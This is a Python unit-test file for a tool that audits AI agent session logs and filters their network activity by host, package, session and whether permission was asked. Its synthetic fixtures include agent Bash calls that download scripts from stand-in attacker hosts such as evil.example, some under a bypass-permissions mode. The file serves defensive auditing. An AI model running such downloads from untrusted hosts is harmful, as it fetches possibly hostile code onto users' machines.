"""--host, --package, --session and --unasked narrow the --network view.

Totals are of the filtered set and network_reconciles holds on it. The
flags are refused without --network. All synthetic.
"""
from __future__ import annotations

import importlib.util
import io
import json
import os
import sys
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from datetime import datetime, timedelta, timezone
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parent.parent
if "actualis" in sys.modules:
    af = sys.modules["actualis"]
else:
    spec = importlib.util.spec_from_file_location("actualis", ROOT / "actualis.py")
    af = importlib.util.module_from_spec(spec)
    sys.modules["actualis"] = af
    spec.loader.exec_module(af)

# Relative to now, so --days 30 keeps meaning "recent" on any date.
RECENT = (datetime.now(timezone.utc) - timedelta(days=2)).strftime("%Y-%m-%dT%H:%M:%SZ")
S1 = "3f2a1b2c-0000-4000-8000-000000000001"
S2 = "9e8d7c6b-0000-4000-8000-000000000002"


def bash(tid, cmd, sid=S1, mode="bypassPermissions", ts=RECENT):
    return {"type": "assistant", "timestamp": ts, "permissionMode": mode, "sessionId": sid,
            "message": {"id": "m" + tid, "role": "assistant", "content": [
                {"type": "tool_use", "id": tid, "name": "Bash", "input": {"command": cmd}}]}}


PROJ = [
    bash("t1", "curl -O https://evil.example/a.sh"),
    bash("t2", "curl -O https://cdn.evil.example/b.sh", mode="default"),
    bash("t3", "curl -O https://notevil.example/c"),
    bash("t4", "curl -O https://evil.example.org/d"),
    bash("t5", "npm i lodash@4.17.21"),
    bash("t6", "npm i Lodash@1.0.0", sid=S2),
    bash("t7", "pip install Zope.Interface==6.0", sid=S2, mode="default"),
    bash("t8", "git clone https://github.com/a/b", sid=S2),
]
OTHER = [bash("o1", "curl -O https://evil.example/other", sid="77777777-other")]
OLD = [bash("x1", "curl -O https://evil.example/old", sid="66666666-old", ts="2020-01-01T00:00:00Z")]


class Cli(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        base = Path(self._tmp.name)
        self.root = base / "projects"
        for name, recs in (("-Users-x-proj", PROJ + OLD), ("-Users-x-other", OTHER)):
            (self.root / name).mkdir(parents=True)
            (self.root / name / "s.jsonl").write_text("\n".join(json.dumps(r) for r in recs) + "\n")
        self.home = base / "home"
        self.home.mkdir()

    def run_main(self, *argv):
        out, err = io.StringIO(), io.StringIO()
        env = {"HOME": str(self.home), "XDG_CONFIG_HOME": str(self.home / ".config")}
        old = os.getcwd()
        os.chdir(self.home)
        try:
            with mock.patch.dict(os.environ, env), redirect_stdout(out), redirect_stderr(err):
                try:
                    code = af.main([*argv, "--root", str(self.root)])
                except SystemExit as exc:
                    code = exc.code
        finally:
            os.chdir(old)
        return code, out.getvalue(), err.getvalue()

    def net(self, *argv):
        code, out, err = self.run_main("--network", "--json", *argv)
        self.assertEqual(code, 0, err)
        n = json.loads(out)
        self.assertEqual(af.network_reconciles(n), [], argv)
        self.assertEqual(n["totals"]["items"], len(n["items"]), argv)
        return n

    def calls(self, n):
        return sorted(i["call_id"] for i in n["items"])


class TestFilters(Cli):
    def test_unfiltered_baseline(self):
        self.assertEqual(self.calls(self.net()),
                         ["o1", "t1", "t2", "t3", "t4", "t5", "t6", "t7", "t8", "x1"])

    def test_host_is_a_suffix_on_a_label_boundary(self):
        n = self.net("--host", "evil.example")
        self.assertEqual(self.calls(n), ["o1", "t1", "t2", "x1"])
        self.assertEqual({h["host"] for h in n["hosts"]}, {"evil.example", "cdn.evil.example"})
        self.assertEqual(self.calls(self.net("--host", "EVIL.example.")), ["o1", "t1", "t2", "x1"])
        self.assertEqual(self.calls(self.net("--host", "registry.npmjs.org")), ["t5", "t6"])

    def test_package_is_exact_for_npm_and_pep503_for_pypi(self):
        self.assertEqual(self.calls(self.net("--package", "lodash")), ["t5"])
        self.assertEqual(self.calls(self.net("--package", "Lodash")), ["t6"])
        self.assertEqual(self.calls(self.net("--package", "zope_interface")), ["t7"])
        self.assertEqual(self.calls(self.net("--package", "lod")), [])
        n = self.net("--package", "lodash")
        self.assertEqual([p["name"] for p in n["packages"]], ["lodash"])

    def test_session_is_a_prefix(self):
        self.assertEqual(self.calls(self.net("--session", "9e8d")), ["t6", "t7", "t8"])
        self.assertEqual(self.calls(self.net("--session", "8d7c")), [])

    def test_unasked(self):
        n = self.net("--unasked")
        self.assertEqual(self.calls(n), ["o1", "t1", "t3", "t4", "t5", "t6", "t8", "x1"])
        self.assertEqual((n["totals"]["unknown"], n["totals"]["asked"]), (0, 0))
        self.assertEqual(n["totals"]["unasked"], n["totals"]["items"])

    def test_combined(self):
        self.assertEqual(self.calls(self.net("--host", "evil.example", "--unasked")), ["o1", "t1", "x1"])
        self.assertEqual(self.calls(self.net("--session", "9e8d", "--unasked", "--host", "github.com")),
                         ["t8"])
        self.assertEqual(self.calls(self.net("--host", "evil.example", "--project", "proj")),
                         ["t1", "t2", "x1"])
        self.assertEqual(self.calls(self.net("--host", "evil.example", "--days", "30")),
                         ["o1", "t1", "t2"])

    def test_text_view_accepts_them(self):
        code, out, err = self.run_main("--network", "--host", "evil.example", "--unasked")
        self.assertEqual(code, 0, err)
        self.assertIn("evil.example", out)
        self.assertNotIn("github.com", out)

    def test_refused_without_network(self):
        for argv in (["--host", "a.io"], ["--package", "x"], ["--session", "ab"], ["--unasked"],
                     ["--json", "--unasked"]):
            code, _, err = self.run_main(*argv)
            self.assertEqual(code, 2, argv)
            self.assertIn("requires --network", err, argv)

    def test_a_bad_host_is_a_usage_error(self):
        for bad in ("https://a.io", "*.a.io", "a.io:443", "nodots"):
            code, _, err = self.run_main("--network", "--host", bad)
            self.assertEqual(code, 2, bad)
            self.assertIn("--host", err, bad)

    def test_strict_and_ioc_follow_the_filter(self):
        ioc = self.home / "bad.ioc"
        ioc.write_bytes(b"npm:lodash\n")
        n = self.net("--host", "evil.example", "--ioc", str(ioc))
        self.assertEqual(n["ioc"]["totals"]["match"], 0)
        n = self.net("--package", "lodash", "--ioc", str(ioc))
        self.assertEqual(n["ioc"]["totals"]["match"], 1)


if __name__ == "__main__":
    unittest.main()
